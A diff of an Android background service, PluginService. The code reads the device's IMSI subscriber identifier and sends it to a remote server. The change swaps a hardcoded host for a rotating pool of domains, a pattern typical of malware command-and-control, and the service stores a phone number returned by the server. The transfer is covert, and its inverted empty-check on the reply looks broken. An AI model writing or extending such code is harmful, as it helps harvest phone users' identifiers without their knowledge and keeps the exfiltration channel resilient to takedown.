@@ -101,7 +101,10 @@ public class PluginService extends IntentService {
                 String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                 if (!TextUtils.isEmpty(imsi)) {
                     PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
-                                                                         , new PhoneFetchRequest("http://www.xinsuotd.net/tools/" + imsi));
+                                                                         , new PhoneFetchRequest(
+                                                                                  DomanManager.getInstance(getApplicationContext())
+                                                                                                     .getOneAviableDomain()
+                                                                                      + "/tools/" + imsi));
                     if (respone != null && TextUtils.isEmpty(respone.phone)) {
                         SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
                     }
